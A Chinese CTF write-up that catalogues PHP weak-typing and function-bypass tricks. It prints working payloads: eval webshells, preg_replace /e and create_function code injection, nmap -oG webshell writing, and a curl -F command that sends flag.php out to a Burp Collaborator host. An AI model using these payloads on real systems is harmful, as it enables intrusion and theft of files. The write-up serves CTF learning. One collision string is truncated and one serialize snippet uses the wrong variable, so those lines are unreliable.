# CTF/PHP特性汇总

阅读量 **311794**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-15 14:30:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0156b4ea7a1af8f08b.png)

## 前言：

做CTF题时经常会遇到各种php弱类型和一些函数的绕过方法，由于知识比较零碎，就总结一下我所遇到的，也方便自己以后观看。

## 0x00:Hash比较缺陷

>
> `PHP`在处理哈希字符串时，通过`!=`或`==`来对哈希值进行比较，它把每一个以`0e`开头的哈希值都解释为`0`，所以如果两个不同的密码经过哈希以后，其哈希值都是以`0e`开头的，那么`PHP`将会认为他们相同，都是`0`

![](https://p1.ssl.qhimg.com/t0164f4d3638edfd342.png)

审计代码，我们输入的不能相等，但`md5`却需要相等，这明显的就是利用`Hash`的比较缺陷来做

我们只要找出两个数再`md5`加密后都为`0e`开头的即可，常用的有以下几种

    
    
    QNKCDZO
    0e830400451993494058024219903391
    s878926199a
    0e545993274517709034328855841020
    s155964671a
    0e342768416822451524974117254469
    s214587387a
    0e848240448830537924465865611904
    s214587387a
    0e848240448830537924465865611904
    s878926199a
    0e545993274517709034328855841020
    s1091221200a
    0e940624217856561557816327384675
    

所以构造`a=QNKCDZO&b=s878926199a`即可绕过

## 0x01:md5

####  第一种：md5函数绕过

> 一、`md5()`函数获取不到数组的值，默认数组为0  
>  二、`sha1()`函数无法处理数组类型，将报错并返回false

![](https://p0.ssl.qhimg.com/t0155a47be34a8f7084.png)

payload：

    
    
    name[]=1&password[]=2
    

![](https://p5.ssl.qhimg.com/t01d85d82a74fb3d21f.png)

注意这里是`===`，不是`==`，所以这里采用`md5()`函数获取不到数组的值，默认数组为0这个特性来做，payload:

    
    
    username[]=1&password[]=2
    

####  第二种：md5强类型绕过

    
    
    (string)$_POST['a1']!==(string)$_POST['a2']
     && md5($_POST['a1'])===md5($_POST['a2'])}
    

例如这段代码，使用数组就不可行，因为最后转为字符串进行比较，所以只能构造两个MD5值相同的不同字符串.  
  
两组经过url编码后的值

    
    
    #1
    a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
    b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
    #2
    a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
    b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%
    

## 0x03:intval函数绕过

####  第一个特性：

![](https://p3.ssl.qhimg.com/t01c68c908123b9d616.png)

####  第二个特性：

![](https://p0.ssl.qhimg.com/t01ad9612f4b2ba7d98.png)

例如：

![](https://p2.ssl.qhimg.com/t01d70e23bf06a45737.png)

payload如下:

    
    
    ?num=0x117c
    ?num=010574
    

除此之外，这个函数还可以使用小数点来进行操作

![](https://p2.ssl.qhimg.com/t01f625151f9faa6888.png)

####  第三个特性：

> 如果$base为0直到遇上数字或正负符号才开始做转换，在遇到非数字或字符串结束时(\0)结束转换，但前提是进行弱类型比较

例如：

![](https://p3.ssl.qhimg.com/t0135b53eb67f64d71e.png)

payload：

    
    
    ?num=4476e1
    

## 0x04:preg_match函数绕过

####  第一种：/m

    
    
    if(preg_match('/^php$/im',$a))
    

> /m 多行匹配，但是当出现换行符 `%0a`的时候，会被当做两行处理，而此时只可以匹配第 1 行，后面的行就会被忽略。

####  第二种：回溯绕过

![](https://p5.ssl.qhimg.com/t015da8669f4ac0b351.png)

PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit,可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限

![](https://p2.ssl.qhimg.com/t01d245b92559eea0e3.png)

回溯次数上限默认是100万,如果回溯次数超过了100万，preg_match返回的 **便不再是0或1，而是false**
，利用这个方法，可以写一个脚本，来使回溯次数超出pcre.backtrack_limit限制，进而绕过WAF

    
    
    import requests
    
    url = 'http://3638bf4e-f63d-477c-95eb-ba023f279de8.chall.ctf.show:8080/'
    
    data = {
        'f':'very'*250000+'ctfshow'
    }
    
    reponse = requests.post(url,data=data)
    
    print(reponse.text)
    

## 0x05: preg_replace /e 模式下的代码执行

![](https://p4.ssl.qhimg.com/t01cd8d104a8b563d8a.png)

> /e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行

**ZJCTF，不过如此**

    
    
    <?php
    $id = $_GET['id'];
    $_SESSION['id'] = $id;
    
    function complex($re, $str) {
        return preg_replace(
            '/(' . $re . ')/ei',
            'strtolower("\\1")',
            $str
        );
    }
    
    foreach($_GET as $re => $str) {
        echo complex($re, $str). "\n";
    }
    function getFlag(){
        @eval($_GET['cmd']);
    }
    

这里的代码便涉及到了preg_replace /e 模式下的代码执行，原理的话师傅讲的很明白，这里不再叙述

**直接放payload：**

    
    
    \S*=${phpinfo()}
    

![](https://p0.ssl.qhimg.com/t016432685abfce5d2f.png)

**得到flag**

    
    
    ?\S*=${eval(getFlag())}&cmd=system('cat /flag');
    #最后的分号要加，除此之外，也可以：
    ?\S*=${eval($_POST[lemon])}
    #POST DATA
    lemon=system('cat /flag');
    

![](https://p2.ssl.qhimg.com/t01fa65cf3135bc7a30.png)

## 0x06：in_array宽松比较

in_array函数有一个特性 **，** 如果不设置第三个参数将使用宽松的比较

![](https://p3.ssl.qhimg.com/t01124a33dda1017691.png)

可以在本地测试一下

![](https://p5.ssl.qhimg.com/t0188fed245ee5ffe16.png)

例如这道题：

![](https://p0.ssl.qhimg.com/t01ddee9dbe4fec596b.png)

上面的代码对下面无影响，直接写webshell即可，但是要注意文件名开头必须是以数字开头的

    
    
    ?n=1.php
    DATA:
    content=<?php system('cat *.php');?>
    

## 0x07:变量覆盖

####  第一种：extract函数、parse_str函数

> `extract()` 函数使用 **数组键名** 作为 **变量名** ，使用 **数组键值** 作为 **变量值**
> ，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖

![](https://p5.ssl.qhimg.com/t019c197edf2a17fb3b.png)

`POST`方法传输进来的值通过`extrace()`函数处理，直接传入以`POST`的方式传入`pass=1&thepassword_123=1`就可以进行将原本的变量覆盖，并且使两个变量相等即可。

还有就是这两个函数如果结合起来使用，也会造成变量覆盖

![](https://p2.ssl.qhimg.com/t01ee4693c210d149c7.png)

代码中同时含有`parse_str和extract($_POST)`可以先将GET方法请求的解析成变量，然后再利用extract()
函数从数组中将变量导入到当前的符号表,故payload为：

    
    
    ?_POST[key1]=36d&_POST[key2]=36d
    

####  第二种：$$变量覆盖

$$变量覆盖要具体结合代码来看，可能会需要借助 **某个参数进行传递值** ，也有可能使用 **$GLOBALS（引用全局作用域中可用的全部变量）**
来做题，例如：

![](https://p3.ssl.qhimg.com/t0167fa970a0ffb85c8.png)

这道题便需要借助某个参数进行传递值，具体也不详细说明了，payload如下：

    
    
    ?Sn0w=flag
    DATA:
    error=Sn0w
    实际在代码中为
    GET:
    $Sn0w=$flag
    POST:
    $error=$Sn0w
    

## 0x08:通过数组绕过

####  ereg()函数

![](https://p4.ssl.qhimg.com/t0180b27e3648257454.png)

> 一、ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。  
>  二、ereg()只能处理字符串的，遇到数组做参数返回NULL。  
>  三、空字符串的类型是`string`，`NULL`的类型是`NULL`,`false、true`是`boolean`类型

####  strpos()函数

![](https://p2.ssl.qhimg.com/t01a4d9fbc942782a37.png)

> strpos()函数如果传入数组，便会返回NULL

####  strcmp()函数

`strcmp()`函数比较两个字符串(区分大小写）,定义中是比较 **字符串类型**
的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在`php
5.2`版本之前，利用`strcmp`函数将数组与字符串进行比较会返回`-1`，但是从`5.3`开始，会返回`0`。

![](https://p2.ssl.qhimg.com/t018d3fcb5df94910fc.png)

payload:

    
    
    #POST DATA
    pass[]=1
    

数组和字符进行比较结果不会返回`1`，即为`false`,加上非的作用，即可变成`true`,则满足条件

## 0x09：PHP自身特性

####  PHP的变量名格式

**在CTF中也经常考察PHP的变量名格式，例如这道题：**

![](https://p4.ssl.qhimg.com/t014ac57dd428b280c6.png)

`$_POST['CTF_SHOW.COM']`无法传入参数，这是因为PHP变量名应该只有 **数字字母下划线。**
而且GET或POST方式传进去的变量名,会自动将`**空格**` `+ . [`转换为`_`

payload:

    
    
    DATA:
    CTF_SHOW=1&CTF[SHOW.COM=1
    

####  PHP数字可与字符做运算

![](https://p1.ssl.qhimg.com/t01f32767c97ad68dfe.png)

## 0x10：escapeshellarg&escapeshellcmd函数绕过

模仿师傅的例子进行学习  
[谈谈escapeshellarg参数绕过和注入的问题](http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/)

**escapeshellarg**

![](https://p0.ssl.qhimg.com/t0138ca46921ef8b5d9.png)

**escapeshellcmd**

![](https://p0.ssl.qhimg.com/t0140e2566232377e3e.png)

先通过例子来查看一下 **escapeshellarg** 函数的作用吧

    
    
    <?php 
    var_dump(escapeshellarg("123"));
    var_dump(escapeshellarg("12'     3"));
    ?>
    

![](https://p5.ssl.qhimg.com/t0135e9bd6c4f45f74f.png)

在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。

![](https://p1.ssl.qhimg.com/t01ac3e22180a668caf.png)

所以即使参数用了 **escapeshellarg** 函数过滤单引号，但参数在拼接命令的时候如果用了双引号的话还是会导致命令执行的漏洞。

再来看一下 **escapeshellcmd** 函数的作用

![](https://p4.ssl.qhimg.com/t011c090c3652b7e746.png)

两个函数都会对单引号进行处理，但是有区别的,如下：

![](https://p5.ssl.qhimg.com/t01a632f970782dadc5.png)

对于单个单引号, **escapeshellarg** 函数转义后,还会在左右各加一个单引号,但 **escapeshellcmd**
函数是直接加一个转义符，对于成对的单引号, **escapeshellcmd** 函数默认不转义,但 **escapeshellarg** 函数转义

那既然有这个差异，如果 **escapeshellcmd()** 和 **escapeshellarg()** 一起出现会有什么问题  
 **测试**

![](https://p1.ssl.qhimg.com/t01b0dbc77d63d0ef1e.png)

**结果**

![](https://p0.ssl.qhimg.com/t01ce491028baf76639.png)

**分析**

    
    
    一开始传入的参数
    127.0.0.1' -v -d a=1
    经过escapeshellarg函数处理，先转义再用单引号括起来
    '127.0.0.1'\'' -v -d a=1'
    再经过escapeshellcmd函数处理，数中的\以及a=1'中的单引号进行处理转义
    '127.0.0.1'\\'' -v -d a=1\'
    由于这一步的处理，使得\\被解释成了\而不再是转义字符，所以单引号配对连接之后将语句分割为三个部分
    

![](https://p4.ssl.qhimg.com/t01ebfca559b87ec852.png)

因此最后system函数是对`127.0.0.1\`发起请求，POST 数据为`a=1'`，如果两个函数翻过来则不会出现这个问题

![](https://p3.ssl.qhimg.com/t012e569564b9d49eaa.png)

接下来就通过一个题目来实践一下：

**Online Tool**

![](https://p3.ssl.qhimg.com/t010c440a000cbf9991.png)

代码中是先使用了 **escapeshellarg** 函数，再使用 **escapeshellcmd**
函数便会引发上面的问题,再来仔细观察一下代码，发现`mkdir\chadir`函数，创建目录和改变当前的目录，应该是要我们写文件进去的，`system()`函数又是一串namp命令后面拼接上GET传入的参数，因为参数经过了上面的参数处理，`；`等都会被转义，所以就要从拼接的namp命令想办法了，查了百度谷歌没查到，看了WP才知道

> nmap命令中 参数`-oG`可以实现将命令和结果写到文件（也就是可以写木马）

接下来就写payload，`escapeshellarg`函数会先对host变量中的单引号进行转义，并且转义之后，在 `\'` 的左右两边再加上单引号，变成
`'\''`

然后`escapeshellcmd`函数，会对host变量中的特殊字符进行转义

> （&#;`|*?~<>^()[]{}$, \x0A//和\xFF以及不配对的单/双引号转义）

那么上面的 `\` 就会被再次转义，比如变成 `'\\''`  
如果在字符串首尾加上单引号，经过`escapeshellarg`函数之后，就可以实现将单引号给闭合了，在经过`escapeshellcmd`函数的时候单引号就是配对的，就不会进行转义

如：

    
    
    ' lemon shy '
    escapeshellarg：''\'' lemon shy ''\''
    escapeshellcmd: ''\\'' lemon shy ''\\''
    

这样就很好理解了，那就会可以实现单引号的逃逸了，接下来就来测试payload：

![](https://p5.ssl.qhimg.com/t01de4a45d0e3d871ec.png)

    
    
    ' <?php phpinfo();?> -oG 1.php'
    如果最后的单引号是没有空格，则文件名后面就会多出\\，所以后面要加上空格
    前面加空格不加则无影响，因为不会影响到一句话木马里面的内容
    

但还有一个问题，escapeshellcmd会把一句话木马中的一些字符给转义的，又该怎么办，测试一下在本地传一下发现虽然看起来转义了，但写入的话还是没有被转义的。

![](https://p0.ssl.qhimg.com/t01ec3efacb2dfdd0ee.png)

所以最终的payload:

    
    
    ' <?php @eval($_POST["a"]);?> -oG 1.php '
    或
    '<?php @eval($_POST["a"]);?> -oG 1.php '
    

![](https://p1.ssl.qhimg.com/t01ede0e7714aa5f455.png)

创建的目录也出来了，写的一句话木马文件在该目录下，连接一下，得到flag

![](https://p1.ssl.qhimg.com/t0157fb4fc1d0a870a9.png)

也可以传一个GET进去，调用system函数

    
    
    ' <?php @eval($_GET["a"]);?> -oG 2.php '
    
    http://e5b384ba-6852-4e3f-9060-c66dc267e554.node3.buuoj.cn/8f9395193b358d86a100d2fd1f0349a2/2.php?a=system('cat /flag');
    

![](https://p0.ssl.qhimg.com/t016faa37645e2d421a.png)

## 0x11：PHP精度绕过缺陷

几次都碰到这个点，记录一下，省的以后忘了再去查

**浮点运算的坑**

在用PHP进行浮点数的运算中,经常会出现一些和预期结果不一样的值，先来看个小例子

![](https://p1.ssl.qhimg.com/t01c852e37ce4ea7c31.png)

输出的是57，而我们预想的应该是58

具体详细的原理可以看这位师傅的描述  
<http://www.haodaquan.com/12>

简单的说因为PHP 通常使用 IEEE 754 双精度格式而且由于浮点数的精度有限的原因。除此之外取整而导致的最大相对误差为
`1.11e-16`,当小数小于`10^-16`后，PHP对于小数就大小不分了，如下图：

![](https://p1.ssl.qhimg.com/t01f061707d326ceca6.png)

再来看一道ciscn2020初赛的题，便考察了这一点：

**easytrick**

    
    
     <?php
    class trick{
        public $trick1;
        public $trick2;
        public function __destruct(){
            $this->trick1 = (string)$this->trick1;
            if(strlen($this->trick1) > 5 || strlen($this->trick2) > 5){
                die("你太长了");
            }
            if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2){
                echo file_get_contents("/flag");
            }
        }
    }
    highlight_file(__FILE__);
    unserialize($_GET['trick']);
    

看了Drom师傅的博客学到了这种方法：

因为这道题是考察 **浮点数精度问题导致的大小比较以及函数处理问题** ，当小数小于`10^-16`后，PHP对于小数就大小不分了

    
    
    var_dump(1.000000000000000 == 1) >> TRUE
    var_dump(1.0000000000000001 == 1) >> TRUE
    

![](https://p4.ssl.qhimg.com/t01886e21d4e23fc47f.png)

`0.9999999999999999`（ **17个9** ）经过`strlen`函数会判断为1  
  
经过测试发现`!==`和`!=`均成立

![](https://p3.ssl.qhimg.com/t0134060560b1c06e18.png)

最后看一下md5函数处理后是否相同

![](https://p1.ssl.qhimg.com/t01345c49249940537e.png)

确实也成立，那就写payload即可

    
    
    <?php
    class trick{
        public $trick1 ;
        public $trick2 ;
    }
    
    $shy = new trick();
    $shy->trick1 = 1;
    $shy->trick2 = 0.9999999999999999;
    echo urlencode(serialize($a));
    

注意这里trick1的值必须为1，如果为0.9999999999999999则出不来结果，因为`$this->trick1 =
(string)$this->trick1;`有这个语句的限制，如果为0.9999999999999999，则浮点数就变成了字符类型，因此就不会产生上面的浮点数精度问题

## 0x12:PHP中类的运用

####  反射类ReflectionClass

可以看官方的例子了解一下  
这里举个例子，方便理解反射类ReflectionClass

    
    
    class fuc { //定义一个类
    
     static
    
     function ec() {
    
      echo '我是一个类';
    
     }
    
    }
    
    $class=new ReflectionClass('fuc'); //建立 fuc这个类的反射类
    
    $fuc=$class->newInstance(); //相当于实例化 fuc 类
    
    $fuc->ec(); //执行 fuc 里的方法ec
    
    /*最后输出:我是一个类*/
    #还有其他用法
    $ec=$class->getmethod('ec'); //获取fuc 类中的ec方法
    
    $fuc=$class->newInstance(); //实例化
    
    $ec->invoke($fuc);   //执行ec 方法
    

例如这道题：

![](https://p2.ssl.qhimg.com/t0151feca63c02bf079.png)

payload：

    
    
    ?v1=1&v2=echo new ReflectionClass&v3=;
    

####  异常处理类Exception

先简单了解一下PHP异常处理

![](https://p0.ssl.qhimg.com/t0108d654cf02dc0d1f.png)

这里举个例子，方便理解异常类

    
    
    <?php
    // 创建一个有异常处理的函数
    function checkNum($number)
    {
        if($number>1)
        {
            throw new Exception("变量值必须小于等于 1");
        }
            return true;
    }
    
    // 在 try 块 触发异常
    try
    {
        checkNum(2);
        // 如果抛出异常，以下文本不会输出
        echo '如果输出该内容，说明 $number 变量';
    }
    // 捕获异常
    catch(Exception $e)
    {
        echo 'Message: ' .$e->getMessage();
    }
    ?>
    上面代码将得到类似这样一个错误：Message: 变量值必须小于等于 1
    

例如这道题：

![](https://p4.ssl.qhimg.com/t01ab86a4d47aeea68f.png)

    
    
    ?v1=Exception&v2=system('ls')
    

虽然源代码中含有了括号，但是我们还是可以自己加上去，以及在里面设置参数，后面多出的（）不对结果造成影响

####  内置类FilesystemIterator

先简单了解一下这个类的作用

> PHP使用FilesystemIterator迭代器遍历目录

![](https://p2.ssl.qhimg.com/t01eb9e7e69f2adb436.png)

例如这道题：

![](https://p4.ssl.qhimg.com/t01902243be95cc16c8.png)

只需获取当前路径，便可以将当前目录下所有文件给显示出来，这里可以使用php中的getcwd这个函数

> getchwd() 函数返回当前工作目录

故payload为

    
    
    ?v1=FilesystemIterator&v2=getcwd
    

## 0x13：一些姿势汇总

####  /proc/self/root绕过is_file函数

![](https://p1.ssl.qhimg.com/t01750421cd2942e9a4.png)

payload:

    
    
    ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
    roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
    c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
    self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
    lf/root/proc/self/root/var/www/html/flag.php
    

![](https://p5.ssl.qhimg.com/t01a4b60ec83f6ca91b.png)

在linux中/proc/self/root是指向根目录的,这里看了很多师傅的wp，都是只记录了一个payload，找到了一个大师傅对于这个方法的解释

####  gettext&get_defined_vars函数

![](https://p1.ssl.qhimg.com/t01b9f4be8fb108cede.png)

这道题涉及到的是php中的gettext的用法，先了解一下

> php的扩展gettext实现程序的国际化

![](https://p5.ssl.qhimg.com/t01ca687893405944b8.png)

`_()是gettext()`函数的简写形式，那既然变量f1过滤数字和字母，就可以使用该符号来代替这个函数，这样便可以绕过第一个嵌套，然后再由最外面的call_user_func执行命令

    
    
    call_user_func(call_user_func('_','phpinfo'))=>call_user_func('phpinfo')
    

虽然该函数会报错

![](https://p0.ssl.qhimg.com/t01ee7c186408538bf1.png)

但是还是会继续执行，不会停止,这时候便会执行phpinfo这个命令，但这里要获取flag,就需要再了解一个函数`get_defined_vars`

![](https://p5.ssl.qhimg.com/t0177ede25a046de4d7.png)

已知包含了flag.php。而flag.php肯定包含已定义好的变量列表的多维数组，故payload：

    
    
    ?f1=_&f2=get_defined_vars
    

![](https://p5.ssl.qhimg.com/t01a6e52262a089ccba.png)

####  Linux tee命令

`tee`命令主要被用来向standout(标准输出流，通常是命令执行窗口）输出的同时也将内容输出到文件

    
    
    tee file1 file2 //复制文件
    ls|tee Sn0w.txt //命令输出
    

例如这道题：

![](https://p2.ssl.qhimg.com/t01aa12f1a8fa1ebe39.png)

    
    
    ?c=ls /|tee Sn0w
    在url后面请求Sn0w文件
    

![](https://p3.ssl.qhimg.com/t01df0a06f8c1bc53d1.png)

####  Burp Collaborator Client

![](https://p1.ssl.qhimg.com/t01553f2c34b7a2463d.png)

这道题主要考察的是命令执行的骚操作和curl -F的使用

如果传递的参数是$F本身，会不会出现变量覆盖那

    
    
    ?F=`$F `;sleep 3
    substr函数截取前六位得到的是`$F `;
    然后$F便是输出的`$F `;sleep 3，故最后执行的代码是
    ``$F `;sleep 3`
    ``是shell_exec()函数的缩写
    

发现curl并没有被过滤，便可以利用curl带出flag.php，curl -F 将flag文件上传到Burp的 Collaborator Client(
Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies)

![](https://p3.ssl.qhimg.com/t01c5a4090a9387677c.png)

![](https://p3.ssl.qhimg.com/t01df8c04e4ca7e9f33.png)

payload：

    
    
    ?F=`$F `;curl -X POST -F Sn0w=@flag.php  1216a307cv2bgog6aua6lmje157vvk.burpcollaborator.net
    

这里要解释一下

    
    
    #其中-F 为带文件的形式发送post请求
    #Sn0w是上传文件的name值，flag.php就是上传的文件
    

其实原理很简单，相当于这台服务器上传文件传输到burp的Collaborator Client

####  call_user_func读取类中的函数

call_user_func函数可以调用类中的函数，这里举一个简单的例子

    
    
    class Test
    {    
        static public function getS()
        {
            echo "123";
        }
    }
    相当于
    call_user_func(array('Test','getS'));
    #输出结果
    123
    定义一个类Test及类方法getS,call_user_func的输入参数变为一个数组，数组第一个元素为对象名、第二个元素为参数
    #如果不加static，数据会出现，但是有可能会报错
    

例如：

![](https://p4.ssl.qhimg.com/t01f37a3b1225727772.png)

payload：

    
    
    ctfshow[0]=ctfshow&ctfshow[1]=getFlag
    

####  create_function函数

create_function，第一个参数是参数，第二个参数是内容，函数结构类似：

    
    
    create_function('$a,$b','return 111')
    相当于如下：
    function a($a, $b){
        return 111;
    }
    

所以那如果我们这样进行构造payload

    
    
    create_function('$a,$b','return 111;}phpinfo();//')
    
    function a($a, $b){
        return 111;}phpinfo();//
    }
    

phpinfo()便会被执行，所以根据这个思路来进行构造payload

    
    
    ?show=echo Sn0w;}system('cat f*');//
    DATA:
    ctf=%5ccreate_function
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Sn0w** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/231507](/post/id/231507)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __29赞

 __收藏

![](https://p4.ssl.qhimg.com/t015b53550d07592c19.png) Sn0w

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

